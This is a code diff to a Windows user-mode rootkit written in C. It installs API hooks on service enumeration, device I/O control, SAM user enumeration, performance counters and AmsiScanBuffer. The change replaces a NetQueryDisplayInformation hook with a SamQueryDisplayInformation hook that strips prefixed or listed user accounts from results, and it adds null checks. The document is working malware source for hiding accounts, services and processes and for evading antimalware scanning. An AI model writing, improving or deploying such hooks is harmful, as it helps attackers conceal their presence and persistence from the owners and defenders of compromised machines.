@@ -25,7 +25,7 @@ static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
 static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
 static NT_SAMENUMERATEUSERSINDOMAIN OriginalSamEnumerateUsersInDomain;
-static NT_NETQUERYDISPLAYINFORMATION OriginalNetQueryDisplayInformation;
+static NT_SAMQUERYDISPLAYINFORMATION OriginalSamQueryDisplayInformation;
 static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
@@ -59,7 +59,7 @@ VOID InitializeHooks()
 	InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	InstallHook("samlib.dll", "SamEnumerateUsersInDomain", (LPVOID*)&OriginalSamEnumerateUsersInDomain, HookedSamEnumerateUsersInDomain);
-	InstallHook("netapi32.dll", "NetQueryDisplayInformation", (LPVOID*)&OriginalNetQueryDisplayInformation, HookedNetQueryDisplayInformation);
+	InstallHook("samlib.dll", "SamQueryDisplayInformation", (LPVOID*)&OriginalSamQueryDisplayInformation, HookedSamQueryDisplayInformation);
 	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	InstallHook("amsi.dll", "AmsiScanBuffer", (LPVOID*)&OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
@@ -101,7 +101,7 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	UninstallHook(OriginalSamEnumerateUsersInDomain, HookedSamEnumerateUsersInDomain);
-	UninstallHook(OriginalNetQueryDisplayInformation, HookedNetQueryDisplayInformation);
+	UninstallHook(OriginalSamQueryDisplayInformation, HookedSamQueryDisplayInformation);
 	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
@@ -797,7 +797,7 @@ static NTSTATUS NTAPI HookedSamEnumerateUsersInDomain(HANDLE domainHandle, PULON
 {
 	NTSTATUS status = OriginalSamEnumerateUsersInDomain(domainHandle, enumerationContext, userAccountControl, buffer, preferedMaximumLength, countReturned);
 
-	if (NT_SUCCESS(status) && buffer && countReturned)
+	if (NT_SUCCESS(status) && buffer && *buffer && countReturned)
 	{
 		PNT_SAM_RID_ENUMERATION rids = (PNT_SAM_RID_ENUMERATION)*buffer;
 		for (ULONG i = 0; i < *countReturned; i++)
@@ -815,18 +815,20 @@ static NTSTATUS NTAPI HookedSamEnumerateUsersInDomain(HANDLE domainHandle, PULON
 
 	return status;
 }
-static NET_API_STATUS WINAPI HookedNetQueryDisplayInformation(LPCWSTR serverName, DWORD level, DWORD index, DWORD entriesRequested, DWORD preferredMaximumLength, LPDWORD returnedEntryCount, PVOID *sortedBuffer)
+static NTSTATUS NTAPI HookedSamQueryDisplayInformation(HANDLE domainHandle, NT_DOMAIN_DISPLAY_INFORMATION displayInformation, ULONG index, ULONG entryCount, ULONG preferredMaximumLength, PULONG totalAvailable, PULONG totalReturned, PULONG returnedEntryCount, LPVOID *sortedBuffer)
 {
-	NET_API_STATUS status = OriginalNetQueryDisplayInformation(serverName, level, index, entriesRequested, preferredMaximumLength, returnedEntryCount, sortedBuffer);
+	NTSTATUS status = OriginalSamQueryDisplayInformation(domainHandle, displayInformation, index, entryCount, preferredMaximumLength, totalAvailable, totalReturned, returnedEntryCount, sortedBuffer);
 
-	if ((status == ERROR_SUCCESS || status == ERROR_MORE_DATA) && returnedEntryCount && sortedBuffer)
+	if (NT_SUCCESS(status) && sortedBuffer && *sortedBuffer && returnedEntryCount && displayInformation == DomainDisplayUser)
 	{
-		PNT_NET_DISPLAY_USER users = (PNT_NET_DISPLAY_USER)*sortedBuffer;
-		for (DWORD i = 0; i < *returnedEntryCount; i++)
+		PNT_SAMPR_DISPLAY_USER users = (PNT_SAMPR_DISPLAY_USER)*sortedBuffer;
+		for (ULONG i = 0; i < *returnedEntryCount; i++)
 		{
-			if (HasPrefix(users[i].Name) || IsUserNameHidden(users[i].Name))
+			users[i].AccountName.Buffer[users[i].AccountName.Length / sizeof(WCHAR)] = L'\0';
+
+			if (HasPrefix(users[i].AccountName.Buffer) || IsUserNameHidden(users[i].AccountName.Buffer))
 			{
-				memmove(&users[i], &users[i + 1], (*returnedEntryCount - i - 1) * sizeof(NT_NET_DISPLAY_USER));
+				memmove(&users[i], &users[i + 1], (*returnedEntryCount - i - 1) * sizeof(NT_SAMPR_DISPLAY_USER));
 				(*returnedEntryCount)--;
 				i--;
 			}
